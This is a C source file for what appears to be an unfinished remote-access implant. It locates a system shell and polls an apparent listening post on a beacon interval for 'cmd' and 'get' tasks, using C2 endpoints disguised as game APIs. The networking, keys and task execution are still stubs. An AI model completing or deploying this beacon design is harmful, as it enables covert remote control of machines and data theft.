// builtin
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <getopt.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <strings.h>
#include <signal.h>
#include <fcntl.h>

// 3rd party
#include "logc/src/log.h"

// local
#include "tasks.h"


// Globals
char * cuid = NULL;
char * key = NULL;
char * api_register = "/api/game/login";
char * api_taskboard = "/api/game";
char * api_drop = "/api/game/achievement";
char * api_root = "http://localhost:6543";
long beacon_time = 5;
long cmd_timeout = 10;
char * command_hint = NULL;
char * command_arg_zero = NULL;


/*
	Attempt to find a shell binary
*/
int get_command_shell() {
	struct stat buf;
	if(!stat("/bin/sh", &buf)) {
		command_hint = "/bin/sh";
		command_arg_zero = "-c";
	}
	else if(!stat("/system/bin/sh", &buf)) {
		command_hint = "/system/bin/sh";
		command_arg_zero = "-c";
	}
	// TODO: does this work on Windows?
	else if(!stat("cmd.exe", &buf)) {
		command_hint = "cmd.exe";
		command_arg_zero = "/C";
	}
	else {
		log_warn("No shell executable found");
		return -1;
	}
	log_info("Shell: %s %s", command_hint, command_arg_zero);
	return 0;
}

/*
	Retrieve session keys from LP
*/
int get_keys() {
	cuid = "dummy_cuid";
	key = "dummy_key";
	return 0;
}

/*
	Return a task enum from the name string
*/
task_type task_from_name(char * name) {
	if(!name) {
		return NOTASK;
	}
	size_t num_task_names = sizeof(task_names) / sizeof(task_names[0]);
	for(size_t i=1; i<num_task_names; i++) {
		if(!strcasecmp(task_names[i], name)) {
			return (task_type)i;
		}
	}
	return NOTASK;
}

/*
	Generate fake tasks for testing
*/
int get_task_fake(char ** taskret) {
	static int fake_task_index = 0;
	*taskret = NULL;
	int ret = 1;
	switch(fake_task_index) {
		case 0:
			*taskret = "cmd";
			break;
		case 1:
			*taskret = "get";
			break;
		case 2:
			*taskret = "GET";
			break;
		case 3:
			*taskret = "blah";
			break;
		case 4:
			*taskret = NULL;
			break;
		default:
			*taskret = NULL;
			ret = 0;
			break;
	}
	fake_task_index ++;
	return ret;
}

/*
	Query the LP for tasks
*/
int get_task(char ** taskret) {
	return get_task_fake(taskret);
}

/*
	Continually query the LP for tasks
*/
void task_loop() {
	char * task = NULL;
	long fail_count = 0;
	while(fail_count < 3) {
		int ok = get_task(&task);
		if(ok) {
			task_type tt = task_from_name(task);
			switch(tt) {
				case CMD:
					log_debug("Running CMD");
					break;
				case GET:
					log_debug("Running GET");
					break;
				default:
					log_warn("Unknown task: %s", task);
			}
		}
		else {
			fail_count ++;
			log_trace("Couldn't get task");
		}
		
	sleep((unsigned int)beacon_time);
	}
	log_warn("Exceded fail count");
}


int main(int argc, char * const *argv)
{
	int opt;
	int log_level = LOG_WARN;
	// url, beacon interval, command timeout
	while((opt = getopt(argc, argv, "u:b:c:qv")) != -1) {
		switch(opt) {
			case 'u':
				api_root = optarg;
				break;
			case 'b':
				beacon_time = atoi(optarg);
				break;
			case 'c':
				cmd_timeout = atoi(optarg);
				break;
			case 'q':
				log_set_quiet(1);
				break;
			case 'v':
				log_level --;
				if(log_level < LOG_TRACE) {
					log_level = LOG_TRACE;
				}
				break;
			default:
				fprintf(stderr, "Usage: %s [-u url] [-b beacon_time] [-c cmd_timeout]\n", argv[0]);
				return -1;
				break;
		}
	}
	log_set_level(log_level);

	// // test logs
	// log_trace("trace");
	// log_debug("debug");
	// log_info("info");
	// log_warn("warn");
	// log_error("error");
	// log_fatal("fatal");

	log_info("Url: %s, beacon: %d, timeout: %d", api_root, beacon_time, cmd_timeout);

	get_command_shell();

	if(get_keys()) {
		log_fatal("Failed to get keys");
		return -2;
	}

	log_info("cuid: %s, key: %s", cuid, key);

	task_loop();

	return 0;
}